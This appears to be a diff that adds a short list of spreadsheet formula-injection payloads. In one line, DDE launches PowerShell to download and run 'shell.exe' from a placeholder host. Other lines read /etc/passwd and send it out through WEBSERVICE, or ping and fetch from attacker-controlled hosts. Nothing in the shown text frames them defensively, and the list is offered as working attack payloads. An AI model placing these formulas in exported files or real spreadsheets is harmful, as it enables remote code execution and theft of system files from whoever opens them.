@@ -1,0 +1,6 @@
+=cmd|’ /C notepad’!’A1′
+=cmd|' /C powershell Invoke-WebRequest "http://domain_collab/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
+=cmd|’/C ping domain_collab′!’A1′
+='file:///etc/passwd'#$passwd.A1
+=WEBSERVICE(CONCATENATE("http://domain_collab:80/",('file:///etc/passwd'#$passwd.A1)))
+=IMAGE("https://vps_ip:80/logo.png")
